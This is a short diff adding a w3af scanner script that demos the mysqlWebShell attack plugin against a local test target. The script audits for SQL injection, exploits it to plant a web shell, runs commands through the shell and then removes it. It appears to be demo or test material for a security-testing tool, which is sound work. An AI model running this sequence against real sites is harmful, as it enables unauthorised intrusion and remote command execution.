@@ -1,0 +1,29 @@
+# This is a demo of the attack plugin mysqlWebShell
+plugins
+
+output console,textFile
+output
+output config textFile
+set fileName output-w3af.txt
+set verbosity 10
+back
+output config console
+set verbosity 0
+back
+
+audit sqli
+discovery webSpider
+grep pathDisclosure
+
+back
+target
+set target http://localhost/w3af/
+back
+
+start
+exploit
+exploit mysqlWebShell
+ls
+w
+rm w3af_webShell.php
+exit
